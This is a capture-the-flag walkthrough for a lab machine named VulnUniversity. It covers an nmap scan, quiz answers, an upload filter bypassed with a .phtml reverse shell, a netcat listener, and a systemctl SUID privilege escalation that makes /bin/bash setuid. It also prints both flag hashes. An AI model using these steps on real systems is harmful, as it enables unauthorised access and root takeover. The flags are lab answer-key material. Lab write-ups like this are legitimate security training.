# Machine name - VulnUniversity

# Nmap scan 
```
# Nmap 7.91 scan initiated Thu Sep 30 10:55:41 2021 as: nmap -sC -sV -oN nmap 10.10.186.240
Nmap scan report for 10.10.186.240
Host is up (0.21s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2021-09-30T10:56:26-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-30T14:56:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 30 10:56:32 2021 -- 1 IP address (1 host up) scanned in 51.81 seconds

```
# So here we found answers of the questions 

## Scan the box, how many ports are open?
```
6
```

## What version of the squid proxy is running on the machine?
```
3.5.12
```

## How many ports will nmap scan if the flag -p-400 was used?
```
400
```

## Using the nmap flag -n what will it not resolve?
```
dns
```

## What is the most likely operating system this machine is running?
```
Ubuntu
```

## What port is the web server running on?
```
3333
```
# Now its time to find something interesting on the webserver using Gobuster, we get
```
/internal/
```
## Here we get the path where we can upload files...

## and here is the answer of our another question 

## What is the directory that has an upload form page?
```
/internal/
```
## And by further directory bruteforcing we get the the path where all the uploaded files listed
```
/internal/uploads
```

# By uploading our revshell with '.php' extension doesn't work, so we tried 
```
.phtml
```
## and we sucessfully uploaded our reverseshell, Its time to get our shell by using Netcat
```
nc -lnvp 4444
```
## Then by selecting the revshell.phtml we got the shell

# Lets stabalize the shell
```
python -c "import pty; pty.spawn('/bin/bash')"
```

# BOOOOOOOOOOOMMMMMMMMM !!!!!!!!!  , We got the user.txt
```
8bd7992fbe8a6ad22a63361004cfcedb
```

# Its time to escalate our privelages, So by using the cmd 
```
find / -perm /4000 2> /dev/null
```

## We got 
```
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```
## From here we get to know our next question answer i.e
## On the system, search for all SUID files. What file stands out?
```
/bin/systemctl
```
# By using GTFO bins we find to escale our previlages 

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

## After a little bit of modification on the code and by running this 
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
## Then by running 
```
bash -p
```
# We are root
## Now we can navigate to our root flag 
# BOOOOOOOOOOOOOMMMMMMMMMMMMMM!!!!!!!!!!!!!!!!!!!!!!!!!!!, HERE WE GOT OUR ROOT FLAG
```
a58ff8579f0a9270368d33a9966c7fd5
```

# <3 By SIG WOTTS
